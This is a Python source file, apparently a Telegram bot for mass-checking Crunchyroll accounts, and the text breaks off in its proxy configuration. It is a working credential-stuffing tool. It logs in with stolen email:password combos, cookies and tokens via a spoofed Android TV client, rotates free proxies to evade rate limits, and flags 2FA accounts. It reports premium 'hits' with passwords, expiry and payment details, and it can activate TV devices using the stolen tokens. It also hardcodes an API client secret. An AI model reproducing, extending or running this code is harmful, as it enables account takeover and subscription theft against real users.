#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CrunchyrollChecker — UNIFIED PREMIUM BOT (v10 — BlazeNXT)
====================================================================
All legacy checkers merged into one, button-driven Telegram bot:

  • CrunchyCLI.py            → email:pass account checks
  • cc2.py                   → Oxaam auto-extract, TV activation
  • crunchy_premium_bot_v8   → bot core: access codes, proxies, checker
  • Baron app-API checker    → Android TV app flow (the one that HITS):
        login via Crunchyroll/ANDROIDTV app UA, premium gate on
        subs/v1 benefits (concurrent_streams), plan Fan/Mega/Ultimate,
        subs/v3 expiry/sku/auto_renew, subs/v4 price/cycle/trial,
        429 rate-limit short-circuit + retry, per-combo proxy rotation

v10 PREMIUM — BlazeNXT
  • 100% button flow, Bot API 9.4 colored buttons:
        style "primary" (blue) / "success" (green) / "danger" (red)
        + icon_custom_emoji_id — with automatic plain fallback
  • BlazeNXT live scan card:
        📈 CRUNCHYROLL Scan — Live  |  ▓▓▓░░ 63% [████████████░░░░] (30/47)
        • Checked  • ⭐ Hits | 💎 Free | 🔐 2FA | ❌ Bad | ⚠️ Errors
        📈 CPM  🕒 Elapsed  ⏳ ETA  |  📡 Live feed (last 3 emails)
  • Premium dashboard (clean, no AIO grid — Crunchyroll only) — BlazeNXT
  • ⭐ Full HIT card on every hit (email, password, plan, expiry,
        days left, auto renew, trial, duration, price, country flag…)
  • Proxy pool: paste proxies in chat → saved to disk, background
        auto-checked (auto-check toggle), clear-pool button
  • App-API checker with proxy→direct fallback per request (no more stuck)

Deploy: Railway (see README) — railway.json + Procfile + requirements.txt
Run:    BOT_TOKEN=... OWNER_ID=... python bot.py
"""

import os
import re
import sys
import csv
import json
import time
import base64
import random
import asyncio
import logging
import tempfile
import threading
import requests
import uuid
from pathlib import Path
from typing import Dict, List, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta, timezone

try:
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] pip3 install requests")
    sys.exit(1)

try:
    from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
    from telegram.constants import ParseMode
    from telegram.error import BadRequest, RetryAfter  # FloodWait in older PTB
    from telegram.ext import (
        Application,
        CommandHandler,
        MessageHandler,
        CallbackQueryHandler,
        ContextTypes,
        filters,
    )
except ImportError:
    print("[!] pip3 install python-telegram-bot==22.8")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None  # oxaam parsing falls back to regex-only

try:
    import socks  # noqa: F401  (PySocks — enables SOCKS5 proxy support)
    SOCKS5_OK = True
except ImportError:
    SOCKS5_OK = False

# Mini App server (Flask) — optional, for Railway same-service hosting
try:
    from flask import Flask, request, jsonify, send_from_directory
    from flask_cors import CORS
    FLASK_OK = True
except ImportError:
    Flask = None
    CORS = None
    FLASK_OK = False


# ===================== CONFIG (env-driven) =====================
def _load_dotenv() -> None:
    """Minimal .env loader (no extra dependency).

    Real environment variables (e.g. the ones set in the Railway Variables tab)
    always win — .env only fills in what is not set yet.
    """
    env_path = Path(__file__).resolve().parent / ".env"
    if not env_path.exists():
        return
    try:
        for line in env_path.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, _, val = line.partition("=")
            key = key.strip()
            val = val.strip().strip("'\"")
            if key and key not in os.environ:
                os.environ[key] = val
    except OSError:
        pass


def _env(name: str, default: str = "") -> str:
    v = os.getenv(name)
    if v is None or str(v).strip() == "":
        return default
    return str(v).strip()


_load_dotenv()

BOT_TOKEN = _env("BOT_TOKEN")
try:
    OWNER_ID = int(_env("OWNER_ID", "0") or 0)
except ValueError:
    OWNER_ID = 0
OWNER_USERNAME = _env("OWNER_USERNAME", "@unknown")
# Multiple admins: OWNER_IDS (comma-separated) + ADMIN_USERNAMES (comma-separated, with or without @)
_raw_ids = _env("OWNER_IDS", "") or _env("ADMIN_IDS", "")
ADMIN_IDS = set()
if _raw_ids:
    for _x in _raw_ids.split(","):
        _x=_x.strip()
        if _x.isdigit():
            try:
                ADMIN_IDS.add(int(_x))
            except: pass
if OWNER_ID:
    ADMIN_IDS.add(OWNER_ID)
# Admin usernames (lowercase, without @)
_raw_un = _env("ADMIN_USERNAMES", "") or _env("ADMIN_USERNAME", "")
ADMIN_USERNAMES = set()
if _raw_un:
    for _u in _raw_un.split(","):
        _u=_u.strip().lstrip("@").lower()
        if _u:
            ADMIN_USERNAMES.add(_u)
if OWNER_USERNAME and OWNER_USERNAME.lstrip("@"):
    ADMIN_USERNAMES.add(OWNER_USERNAME.lstrip("@").lower())

def is_admin(uid: int, username: str = None) -> bool:
    if uid in ADMIN_IDS:
        return True
    if username:
        un = str(username).lstrip("@").lower()
        if un in ADMIN_USERNAMES:
            return True
    return False

DATA_DIR = Path(_env("DATA_DIR", "data"))
DATA_DIR.mkdir(parents=True, exist_ok=True)

# Mini App config
MINI_APP_URL = _env("MINI_APP_URL", "") or _env("WEBAPP_URL", "")
MINI_APP_PATH = Path(__file__).resolve().parent / "miniapp"
PORT = int(_env("PORT", "8000") or 8000)

THREADS = max(1, int(_env("THREADS", "35")))
PROXY_REFRESH_MINUTES = max(1, int(_env("PROXY_REFRESH_MINUTES", "15")))
MAX_PROXIES_TO_KEEP = max(1, int(_env("MAX_PROXIES_TO_KEEP", "80")))
PROXY_TEST_TIMEOUT = int(_env("PROXY_TEST_TIMEOUT", "8"))
PROXY_TEST_SAMPLE = int(_env("PROXY_TEST_SAMPLE", "250"))
CHECK_TIMEOUT = int(_env("CHECK_TIMEOUT", "15"))
MAX_FILE_MB = int(_env("MAX_FILE_MB", "20"))  # Telegram Bot API download limit
PREMIUM_ONLY_DEFAULT = _env("PREMIUM_ONLY", "true").lower() in ("1", "true", "yes", "on")
MAX_PASTED_CREDS = 2000
MAX_PASTED_PROXIES = 5000
MAX_HIT_CARDS = 150  # per-hit detail cards per check (rest goes to the export file)

START_TIME = time.time()
CHECKS_DONE = 0
CHECKS_LOCK = threading.Lock()


def bump_checks(n: int) -> None:
    global CHECKS_DONE
    with CHECKS_LOCK:
        CHECKS_DONE += n


def uptime() -> str:
    s = int(time.time() - START_TIME)
    d, r = divmod(s, 86400)
    h, r = divmod(r, 3600)
    m, sec = divmod(r, 60)
    parts = []
    if d:
        parts.append(f"{d}d")
    if h:
        parts.append(f"{h}h")
    parts.append(f"{m}m {sec}s")
    return " ".join(parts)


def _fmt_duration(sec: float) -> str:
    """Format seconds as '1m 10s' or '192m 18s' like BlazeNXT."""
    sec = int(sec)
    if sec < 0:
        sec = 0
    m, s = divmod(sec, 60)
    h, m = divmod(m, 60)
    if h:
        return f"{h}h {m}m {s}s"
    return f"{m}m {s}s"


def _fmt_cpm(processed: int, elapsed: float) -> int:
    if elapsed <= 0 or processed <= 0:
        return 0
    return int(processed / elapsed * 60)


def _fmt_eta(total: int, processed: int, cpm: int) -> str:
    if cpm <= 0 or total <= processed:
        return "—"
    remaining = total - processed
    eta_sec = int(remaining * 60 / cpm)
    return _fmt_duration(eta_sec)


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
logger = logging.getLogger("CrunchyBot")


# ===================== SMALL HELPERS =====================
def esc(v) -> str:
    """HTML-escape for safe Telegram HTML messages."""
    if v is None or v == "":
        return "N/A"
    return str(v).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def now_utc() -> datetime:
    return datetime.now(timezone.utc)


def parse_iso(s) -> Optional[datetime]:
    if not s:
        return None
    try:
        dt = datetime.fromisoformat(str(s).replace("Z", "+00:00"))
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        return dt
    except (ValueError, TypeError):
        return None


def fmt_dt(dt: Optional[datetime]) -> str:
    if not dt:
        return "N/A"
    return dt.astimezone(timezone.utc).strftime("%d-%m-%Y %H:%M UTC")


def days_left_until(iso_date: str) -> str:
    if not iso_date:
        return "N/A"
    dt = parse_iso(iso_date)
    if not dt:
        return "N/A"
    return str(max(0, (dt - now_utc()).days))


def generate_code() -> str:
    chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    return "".join(random.choice(chars) for _ in range(12))


def _clean_err(e) -> str:
    """Collapse newlines/whitespace from exception strings for tidy output."""
    return " ".join(str(e).split())[:60]


def flag_emoji(cc) -> str:
    """Country code -> flag emoji (IN -> 🇮)."""
    cc = (cc or "").upper().strip()
    if len(cc) != 2 or not cc.isalpha():
        return ""
    return "".join(chr(0x1F1E6 + ord(c) - 65) for c in cc)


# ===================== CRUNCHYROLL API =====================
API_HOST = "https://beta-api.crunchyroll.com"
# Public web-SSO client id/secret (same as the official client, used by all legacy tools)
CLIENT_ID = "rjs0ltx0dbwkliwxdzdf"
CLIENT_SECRET = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"

# App (Android TV) flow — the "Baron" flow that hits valid accounts
APP_UA = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"
APP_DEVICE_TYPE = "Google SDK built for x86"
APP_DEVICE_NAME = "sdk_google_atv_x86"
BARO_WUA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
            "(KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36")
PLAN_BY_STREAMS = {"1": "Fan", "4": "Mega Fan", "6": "Ultimate Fan"}
BILLING_MAP = {"P1D": "Daily", "P1W": "Weekly", "P1M": "Monthly", "P3M": "3 Months", "P1Y": "Annual"}

COUNTRY_MAP = {
    "AF": "Afghanistan", "AL": "Albania", "DZ": "Algeria", "AD": "Andorra",
    "AO": "Angola", "AG": "Antigua and Barbuda", "AR": "Argentina", "AM": "Armenia",
    "AU": "Australia", "AT": "Austria", "AZ": "Azerbaijan", "BS": "Bahamas",
    "BH": "Bahrain", "BD": "Bangladesh", "BB": "Barbados", "BY": "Belarus",
    "BE": "Belgium", "BZ": "Belize", "BJ": "Benin", "BT": "Bhutan",
    "BO": "Bolivia", "BA": "Bosnia and Herzegovin", "BW": "Botswana", "BR": "Brazil",
    "BN": "Brunei", "BG": "Bulgaria", "BF": "Burkina Faso", "BI": "Burundi",
    "KH": "Cambodia", "CM": "Cameroon", "CA": "Canada", "CV": "Cape Verde",
    "CF": "Central African Republic", "TD": "Chad", "CL": "Chile", "CN": "China",
    "CO": "Colombia", "KM": "Comoros", "CG": "Congo", "CD": "DR Congo",
    "CR": "Costa Rica", "CI": "Cote d'Ivoire", "HR": "Croatia", "CU": "Cuba",
    "CW": "Curacao", "CY": "Cyprus", "CZ": "Czech Republic", "DK": "Denmark",
    "DJ": "Djibouti", "DM": "Dominica", "DO": "Dominican Republic", "EC": "Ecuador",
    "EG": "Egypt", "SV": "El Salvador", "GQ": "Equatorial Guinea", "ER": "Eritrea",
    "EE": "Estonia", "ET": "Ethiopia", "FJ": "Fiji", "FI": "Finland",
    "FR": "France", "GA": "Gabon", "GM": "Gambia", "GE": "Georgia",
    "DE": "Germany", "GH": "Ghana", "GR": "Greece", "GD": "Grenada",
    "GT": "Guatemala", "GN": "Guinea", "GW": "Guinea-Bissau", "GY": "Guyana",
    "HT": "Haiti", "HN": "Honduras", "HK": "Hong Kong", "HU": "Hungary",
    "IS": "Iceland", "IN": "India", "ID": "Indonesia", "IR": "Iran",
    "IQ": "Iraq", "IE": "Ireland", "IL": "Israel", "IT": "Italy",
    "JM": "Jamaica", "JP": "Japan", "JO": "Jordan", "KZ": "Kazakhstan",
    "KE": "Kenya", "KI": "Kiribati", "KP": "North Korea", "KR": "South Korea",
    "KW": "Kuwait", "KG": "Kyrgyzstan", "LA": "Laos", "LV": "Latvia",
    "LB": "Lebanon", "LS": "Lesotho", "LR": "Liberia", "LY": "Libya",
    "LI": "Liechtenstein", "LT": "Lithuania", "LU": "Luxembourg", "MO": "Macao",
    "MK": "North Macedonia", "MG": "Madagascar", "MW": "Malawi", "MY": "Malaysia",
    "MV": "Maldives", "ML": "Mali", "MT": "Malta", "MH": "Marshall Islands",
    "MR": "Mauritania", "MU": "Mauritius", "MX": "Mexico", "FM": "Micronesia",
    "MD": "Moldova", "MC": "Monaco", "MN": "Mongolia", "ME": "Montenegro",
    "MA": "Morocco", "MZ": "Mozambique", "MM": "Myanmar", "NA": "Namibia",
    "NR": "Nauru", "NP": "Nepal", "NL": "Netherlands", "NZ": "New Zealand",
    "NI": "Nicaragua", "NE": "Niger", "NG": "Nigeria", "NO": "Norway",
    "OM": "Oman", "PK": "Pakistan", "PW": "Palau", "PS": "Palestine",
    "PA": "Panama", "PG": "Papua New Guinea", "PY": "Paraguay", "PE": "Peru",
    "PH": "Philippines", "PL": "Poland", "PT": "Portugal", "PR": "Puerto Rico",
    "QA": "Qatar", "RO": "Romania", "RU": "Russia", "RW": "Rwanda",
    "SA": "Saudi Arabia", "SN": "Senegal", "RS": "Serbia", "SC": "Seychelles",
    "SL": "Sierra Leone", "SG": "Singapore", "SK": "Slovakia", "SI": "Slovenia",
    "SB": "Solomon Islands", "SO": "Somalia", "ZA": "South Africa", "SS": "South Sudan",
    "ES": "Spain", "LK": "Sri Lanka", "SD": "Sudan", "SR": "Suriname",
    "SZ": "Eswatini", "SE": "Sweden", "CH": "Switzerland", "SY": "Syria",
    "TW": "Taiwan", "TJ": "Tajikistan", "TZ": "Tanzania", "TH": "Thailand",
    "TL": "Timor-Leste", "TG": "Togo", "TO": "Tonga", "TT": "Trinidad and Tobago",
    "TN": "Tunisia", "TR": "Turkey", "TM": "Turkmenistan", "TV": "Tuvalu",
    "UG": "Uganda", "UA": "Ukraine", "AE": "UAE", "GB": "United Kingdom",
    "US": "United States", "UY": "Uruguay", "UZ": "Uzbekistan", "VU": "Vanuatu",
    "VE": "Venezuela", "VN": "Vietnam", "YE": "Yemen", "ZM": "Zambia",
    "ZW": "Zimbabwe",
}

_tls = threading.local()


def get_session() -> requests.Session:
    """Thread-local session with sane connection pooling."""
    s = getattr(_tls, "s", None)
    if s is None:
        s = requests.Session()
        s.mount("https://", HTTPAdapter(pool_connections=20, pool_maxsize=20))
        s.mount("http://", HTTPAdapter(pool_connections=20, pool_maxsize=20))
        _tls.s = s
    return s


def _req(session, method, url, proxy, **kw):
    """Request with proxy -> direct fallback (dead proxy must never kill a check)."""
    try:
        return session.request(method, url, proxies=proxy, timeout=CHECK_TIMEOUT, **kw)
    except requests.RequestException:
        if proxy:
            return session.request(method, url, timeout=CHECK_TIMEOUT, **kw)
        raise


def _blank_data(user: str) -> dict:
    return {
        "user": user.split("@")[0] if user else "", "verified": False,
        "plan": "", "sku": "", "streams": "", "expiry": "", "days_left": "N/A",
        "renew": False, "trial": False, "duration": "", "price": "",
        "currency": "", "plan_type": "", "created": "", "payment": "",
        "cc": "", "country_name": "", "info": "",
        # Detailed checker fields
        "account_id": "", "external_id": "", "sub_id": "", "sub_status": "",
        "next_renewal": "", "start_date": "", "billing_cycle": "",
        "payment_method": "", "benefits": "", "checked_at": "",
        "proxy_used": "", "response_time": "",
    }


# ---------------- App-API login (Baron flow) ----------------
def app_login(user: str, pw: str, proxy: Optional[dict] = None):
    """Android TV password-grant login. Returns (token_json|None, st)."""
    s = get_session()
    try:
        r = _req(s, "POST", f"{API_HOST}/auth/v1/token", proxy, data={
            "grant_type": "password",
            "username": user, "password": pw,
            "scope": "offline_access",
            "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET,
            "device_type": APP_DEVICE_TYPE,
            "device_id": str(uuid.uuid4()),
            "device_name": APP_DEVICE_NAME,
        }, headers={
            "User-Agent": APP_UA,
            "Accept": "application/json",
            "Accept-Charset": "UTF-8",
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "ETP-Anonymous-ID": str(uuid.uuid4()),
            "Request-Type": "SignIn",
        })
    except requests.RequestException as e:
        return None, f"network: {_clean_err(e)}"
    src = r.text or ""
    low = src.lower()
    if r.status_code == 429 or "too_many_requests" in src or "rate limited" in low:
        return None, "rate"
    # 2FA / MFA detection (counts as distinct bucket in premium UI)
    if any(x in low for x in ("two_factor", "2fa", "mfa_required", "otp_required", "otp_code", "verification_required")):
        return None, "2fa"
    if "invalid_grant" in src or "invalid_credentials" in src or r.status_code in (400, 401):
        return None, "bad"
    try:
        j = r.json()
    except ValueError:
        return None, f"json fail ({r.status_code})"
    if r.status_code != 200 or not isinstance(j, dict) or not j.get("access_token"):
        return None, "no token"
    return j, "ok"


# ---------------- App-API account check (the HITTER) ----------------
def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
    """Baron app-API flow. Returns (st, data): st in hit/free/bad/rate/err."""
    d = _blank_data(user)
    j, st = app_login(user, pw, proxy)
    if j is None:
        if st == "bad":
            return "bad", d
        if st == "rate":
            return "rate", d
        if st == "2fa":
            return "2fa", d
        return "err", d
    tk = j["access_token"]
    hdr = {
        "Authorization": f"Bearer {tk}",
        "User-Agent": BARO_WUA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    }
    s = get_session()

    # multiprofile -> display name
    try:
        r = _req(s, "GET", f"{API_HOST}/accounts/v1/me/multiprofile", proxy, headers=hdr)
        mp = r.json()
        if isinstance(mp, dict):
            profiles = mp.get("profiles") or []
            primary = next((p for p in profiles if p.get("is_primary")), None)
            if not primary and profiles:
                primary = profiles[0]
            if primary and primary.get("profile_name"):
                d["user"] = primary["profile_name"]
    except (requests.RequestException, ValueError):
        pass

    # /me -> ids + verified
    me = {}
    try:
        r = _req(s, "GET", f"{API_HOST}/accounts/v1/me", proxy, headers=hdr)
        me = r.json()
    except (requests.RequestException, ValueError):
        pass
    if isinstance(me, dict):
        d["verified"] = bool(me.get("email_verified"))
        if me.get("username") and d["user"] == (user.split("@")[0] if user else ""):
            d["user"] = me["username"]
    ext = me.get("external_id", "") if isinstance(me, dict) else ""
    acc = me.get("account_id", "") if isinstance(me, dict) else ""
    if not ext:
        return "free", d

    # benefits v1 — the premium gate (Baron logic)
    try:
        r = _req(s, "GET", f"{API_HOST}/subs/v1/subscriptions/{ext}/benefits", proxy, headers=hdr)
        bsrc = r.text if r.status_code == 200 else ""
    except requests.RequestException:
        bsrc = ""
    if not bsrc or any(x in bsrc for x in (
        "subscription.not_found", "Subscription Not Found",
        '"total":0', '"subscription_country":""',
    )) or "concurrent_streams" not in bsrc:
        return "free", d

    # Detailed: store ids
    d["account_id"] = acc or ""
    d["external_id"] = ext or ""
    d["benefits"] = bsrc[:500] if bsrc else ""
    # HIT
    m = re.search(r'"concurrent_streams\.(\d+)"', bsrc)
    if m:
        d["streams"] = m.group(1)
        d["plan"] = PLAN_BY_STREAMS.get(m.group(1), f"Plan {m.group(1)}")
    m = re.search(r'"subscription_country"\s*:\s*"([^"]+)"', bsrc)
    if m:
        d["cc"] = m.group(1)
        d["country_name"] = COUNTRY_MAP.get(d["cc"], d["cc"])
    m = re.search(r'"source"\s*:\s*"([^"]+)"', bsrc)
    if m:
        d["payment"] = m.group(1)
        d["payment_method"] = m.group(1)

    # subs v3 — expiry / sku / auto renew
    if acc:
        try:
            r = _req(s, "GET", f"{API_HOST}/subs/v3/subscriptions/{acc}", proxy, headers=hdr)
            s3 = r.text or ""
            m = re.search(r'"expiration_date"\s*:\s*"([^T"]+)', s3)
            if m:
                d["expiry"] = m.group(1)
                d["days_left"] = days_left_until(m.group(1))
            m = re.search(r'"auto_renew"\s*:\s*(true|false)', s3)
            if m:
                d["renew"] = m.group(1) == "true"
            m = re.search(r'"sku"\s*:\s*"([^"]+)"', s3)
            if m:
                d["sku"] = m.group(1)
            # detailed
            m = re.search(r'"subscription_id"\s*:\s*"([^"]+)"', s3)
            if m:
                d["sub_id"] = m.group(1)
            m = re.search(r'"status"\s*:\s*"([^"]+)"', s3)
            if m:
                d["sub_status"] = m.group(1)
        except requests.RequestException:
            pass

    # subs v4 — price / cycle / trial / plan type / created (rich card)
    if acc:
        try:
            r = _req(s, "GET", f"{API_HOST}/subs/v4/accounts/{acc}/subscriptions", proxy, headers=hdr)
            v4 = r.json()
            if isinstance(v4, dict):
                subs4 = v4.get("subscriptions") or []
                sub4 = subs4[0] if subs4 else {}
                plan4 = sub4.get("plan") or {}
                price4 = plan4.get("price") or {}
                if sub4.get("nextRenewalDate") and not d["expiry"]:
                    d["expiry"] = sub4["nextRenewalDate"][:10]
                    d["days_left"] = days_left_until(sub4["nextRenewalDate"])
                if sub4.get("startDate"):
                    d["created"] = sub4["startDate"][:10]
                d["trial"] = bool(plan4.get("activeFreeTrial"))
                if plan4.get("planType"):
                    d["plan_type"] = plan4["planType"]
                cyc = price4.get("cycleDuration") or ""
                if cyc:
                    d["duration"] = BILLING_MAP.get(cyc, cyc)
                if price4.get("amount") is not None:
                    d["price"] = str(price4["amount"])
                    d["currency"] = price4.get("currencyCode", "")
                # detailed billing
                d["billing_cycle"] = price4.get("cycleDuration") or d.get("duration", "")
                d["next_renewal"] = sub4.get("nextRenewalDate", "")[:10] if sub4.get("nextRenewalDate") else d.get("expiry", "")
                d["start_date"] = sub4.get("startDate", "")[:10] if sub4.get("startDate") else d.get("created", "")
                d["sub_status"] = sub4.get("status", "") or d.get("sub_status", "")
                d["sub_id"] = sub4.get("subscriptionId", "") or sub4.get("id", "") or d.get("sub_id", "")
                pay = v4.get("currentPaymentMethod") or {}
                if pay.get("name") and not d["payment"]:
                    d["payment"] = pay["name"]
                d["payment_method"] = pay.get("name", "") or d.get("payment", "")
        except (requests.RequestException, ValueError):
            pass
    return "hit", d


def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tries: int = 2):
    """Baron-style rate-limit retry: short backoff, then give up as 'rate'."""
    st, d = check_account_app(user, pw, proxy)
    i = 0
    while st == "rate" and i < tries:
        time.sleep(4 + random.random() * 3)
        st, d = check_account_app(user, pw, proxy)
        i += 1
    return st, d


# ---------------- Token / cookie checks (web flow) ----------------
def etp_rt_to_token(etp_rt: str, proxy: Optional[dict] = None):
    s = get_session()
    data = {
        "grant_type": "etp_rt_cookie",
        "device_id": str(uuid.uuid4()),
        "device_type": "Firefox on Windows",
    }
    headers = {
        "User-Agent": BARO_WUA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "Origin": "https://www.crunchyroll.com",
        "Referer": "https://www.crunchyroll.com/",
    }
    try:
        r = s.post(
            f"{API_HOST}/auth/v1/token", data=data, headers=headers,
            cookies={"etp_rt": etp_rt}, timeout=CHECK_TIMEOUT, proxies=proxy,
        )
    except requests.RequestException as e:
        return None, f"network: {_clean_err(e)}"
    try:
        j = r.json()
    except ValueError:
        return None, f"http_{r.status_code}"
    if r.status_code != 200 or not isinstance(j, dict) or "access_token" not in j:
        return None, (j or {}).get("error") or (j or {}).get("code") or f"http_{r.status_code}"
    return j, ""


def cr_me(bearer: str, proxy: Optional[dict] = None):
    s = get_session()
    try:
        r = s.get(f"{API_HOST}/accounts/v1/me",
                  headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
                  timeout=CHECK_TIMEOUT, proxies=proxy)
    except requests.RequestException as e:
        return None, f"network: {_clean_err(e)}"
    if r.status_code in (401, 403):
        return None, f"http_{r.status_code}"
    if r.status_code != 200:
        return None, f"http_{r.status_code}"
    try:
        return r.json(), ""
    except ValueError:
        return None, "bad_json"


def cr_subscriptions(account_id, bearer: str, proxy: Optional[dict] = None):
    if not account_id:
        return None
    s = get_session()
    try:
        r = s.get(f"{API_HOST}/subs/v4/accounts/{account_id}/subscriptions",
                  headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
                  timeout=CHECK_TIMEOUT, proxies=proxy)
    except requests.RequestException:
        return None
    if r.status_code != 200:
        return None
    try:
        return r.json()
    except ValueError:
        return None


def cr_profiles(bearer: str, proxy: Optional[dict] = None):
    s = get_session()
    try:
        r = s.get(f"{API_HOST}/accounts/v1/me/multiprofile",
                  headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
                  timeout=CHECK_TIMEOUT, proxies=proxy)
    except requests.RequestException:
        return None
    if r.status_code != 200:
        return None
    try:
        return r.json()
    except ValueError:
        return None


def is_token_expired(token: str) -> bool:
    """Cheap local JWT expiry check (saves API calls)."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return False
        payload = parts[1] + "=" * (-len(parts[1]) % 4)
        data = json.loads(base64.urlsafe_b64decode(payload))
        exp = data.get("exp")
        return bool(exp and int(exp) < time.time())
    except Exception:
        return False


def check_token_or_cookie(bearer: str, proxy: Optional[dict] = None):
    """Web-flow check from an access token. Returns (st, data)."""
    me_data, merr = cr_me(bearer, proxy)
    if not me_data:
        return "err", dict(_blank_data(""), info=merr or "me_failed")
    acc = me_data.get("account_id")
    sub_data = cr_subscriptions(acc, bearer, proxy)
    prof_data = cr_profiles(bearer, proxy)

    subs = (sub_data or {}).get("subscriptions") or []
    active = next((x for x in subs if str(x.get("status", "")).lower() == "active"), None)
    premium = active is not None
    if not premium and me_data.get("external_id"):
        try:
            s = get_session()
            r = _req(s, "GET",
                     f"{API_HOST}/subs/v1/subscriptions/{me_data['external_id']}/benefits",
                     proxy,
                     headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA})
            if r.status_code == 200 and "concurrent_streams" in (r.text or ""):
                premium = True
        except requests.RequestException:
            pass

    d = _blank_data(me_data.get("email") or "")
    d["user"] = me_data.get("email") or me_data.get("username") or d["user"]
    d["verified"] = bool(me_data.get("email_verified"))
    profiles = (prof_data or {}).get("profiles") or []
    primary = next((p for p in profiles if p.get("is_primary")), None)
    if primary and primary.get("profile_name"):
        d["user"] = primary["profile_name"]
    if active:
        plan = active.get("plan") or {}
        price = plan.get("price") or {}
        d["plan"] = (plan.get("tier") or {}).get("text") or active.get("sku") or "Premium"
        for b in plan.get("benefits") or []:
            nm = str(b.get("name", "")) if isinstance(b, dict) else ""
            if nm.startswith("concurrent_streams"):
                m = re.search(r"(\d+)$", nm)
                if m:
                    d["streams"] = m.group(1)
                break
        d["cc"] = plan.get("countryCode") or ""
        d["country_name"] = COUNTRY_MAP.get(d["cc"], d["cc"])
        cyc = price.get("cycleDuration") or ""
        d["duration"] = BILLING_MAP.get(cyc, cyc)
        d["currency"] = price.get("currencyCode") or ""
        d["price"] = str(price.get("amount", ""))
        d["trial"] = bool(plan.get("activeFreeTrial"))
        d["plan_type"] = plan.get("planType") or ""
        d["expiry"] = (active.get("nextRenewalDate") or "")[:10]
        d["days_left"] = days_left_until(active.get("nextRenewalDate") or "")
        d["created"] = (active.get("startDate") or "")[:10]
        d["renew"] = active.get("subscriptionQualifier") == "RECURRING"
        pay = (sub_data or {}).get("currentPaymentMethod") or {}
        d["payment"] = pay.get("name") or ""
    return ("hit" if premium else "free"), d


def check_credential(cred: dict, proxy: Optional[dict] = None) -> dict:
    """Check one credential of any type. Returns {"st": hit/free/bad/rate/err/2fa, "data": {...}}."""
    t = cred.get("type")
    try:
        if t == "email":
            st, d = check_account_app_retry(cred["value"], cred.get("password", ""), proxy)
            return {"st": st, "data": d}
        if t == "cookie":
            j, err = etp_rt_to_token(cred["value"], proxy)
            if not j:
                return {"st": "err", "data": dict(_blank_data(""), info=err)}
            st, d = check_token_or_cookie(j["access_token"], proxy)
            return {"st": st, "data": d}
        if t == "token":
            if is_token_expired(cred["value"]):
                return {"st": "err", "data": dict(_blank_data(""), info="expired token")}
            st, d = check_token_or_cookie(cred["value"], proxy)
            return {"st": st, "data": d}
    except Exception as e:  # one bad cred must never kill the run
        return {"st": "err", "data": dict(_blank_data(""), info=_clean_err(e))}
    return {"st": "err", "data": dict(_blank_data(""), info="unknown_type")}


def activate_tv(bearer: str, code: str):
    """TV device activation (the cc2.py flow). Tries both API hosts."""
    s = get_session()
    last_err = "no_hosts_tried"
    for base in (API_HOST, "https://www.crunchyroll.com"):
        try:
            r = s.post(
                f"{base}/auth/v1/device",
                json={"user_code": code},
                headers={
                    "Authorization": f"Bearer {bearer}",
                    "User-Agent": BARO_WUA,
                    "Content-Type": "application/json",
                },
                timeout=20,
            )
            if r.status_code == 200:
                return True, ""
            last_err = f"http_{r.status_code}"
            try:
                j = r.json()
                if isinstance(j, dict) and j.get("code"):
                    last_err = str(j["code"])
            except ValueError:
                pass
        except requests.RequestException as e:
            last_err = f"network: {_clean_err(e)}"
    return False, last_err


# ===================== PROXY POOL =====================
PROXY_SOURCES = [
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/http_all.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/socks5_all.txt",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
]
PROXY_TEST_URLS = [
    "https://httpbin.org/ip",
